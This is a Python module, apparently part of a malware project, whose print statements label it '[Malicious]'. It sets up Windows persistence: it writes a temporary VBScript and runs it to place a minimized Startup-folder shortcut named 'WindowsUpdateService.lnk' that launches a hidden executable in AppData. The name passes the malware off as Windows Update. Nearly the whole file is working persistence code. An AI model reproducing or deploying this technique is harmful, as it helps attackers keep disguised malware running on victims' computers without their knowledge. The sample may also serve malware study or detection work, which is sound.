"""
Auto-Run Function 5: Add Startup Shortcut
Creates shortcut in Startup folder for automatic execution
"""

import os
import winreg

def add_startup_shortcut():
    """
    Add shortcut to Startup folder
    Returns: True if successful, False otherwise
    """
    print("[Malicious] Function 5: Adding startup shortcut...")
    
    try:
        # Get Startup folder path
        startup_folder = os.path.join(os.getenv('APPDATA'), 
                                     r'Microsoft\Windows\Start Menu\Programs\Startup')
        
        # Get hidden executable path
        appdata = os.getenv('APPDATA')
        hidden_exe = os.path.join(appdata, "WindowsUpdateService", "WindowsUpdateService.exe")
        
        # Create shortcut (using VBScript method for simplicity)
        shortcut_path = os.path.join(startup_folder, "WindowsUpdateService.lnk")
        
        # Create VBScript to make shortcut
        vbs_script = f'''
Set oWS = WScript.CreateObject("WScript.Shell")
sLinkFile = "{shortcut_path}"
Set oLink = oWS.CreateShortcut(sLinkFile)
oLink.TargetPath = "{hidden_exe}"
oLink.WindowStyle = 7
oLink.Description = "Windows Update Service"
oLink.Save
'''
        
        vbs_file = os.path.join(os.getenv('TEMP'), 'create_shortcut.vbs')
        with open(vbs_file, 'w') as f:
            f.write(vbs_script)
        
        # Execute VBScript
        os.system(f'cscript //nologo "{vbs_file}"')
        os.remove(vbs_file)
        
        print(f"[Malicious] Created startup shortcut: {shortcut_path}")
        return True
    except Exception as e:
        print(f"[Malicious] Error creating startup shortcut: {e}")
        return False
